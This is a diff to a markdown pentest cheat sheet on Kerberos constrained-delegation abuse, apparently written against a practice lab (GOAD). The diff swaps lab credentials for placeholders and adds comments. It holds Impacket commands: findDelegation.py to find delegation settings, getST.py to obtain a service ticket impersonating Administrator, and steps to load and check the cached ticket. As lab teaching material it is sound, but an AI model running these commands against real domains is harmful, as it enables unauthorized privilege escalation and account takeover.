@@ -5,7 +5,7 @@
 #### Impacket
 
 ```bash
-findDelegation.py NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local
+findDelegation.py domain.local/username:password -target-domain domain.local
 ```
 
 
@@ -17,14 +17,19 @@ findDelegation.py NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain nor
 
 ### The Attack
 
+Get TGS for the user for the impersonated user:
+
 ```bash
 getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 
+Set environment variable for Kerberos cached credential file:
 
 ```bash
 export KRB5CCNAME=./Administrator.ccache
 ```
+
+Verify:
 
 ```bash
 klist
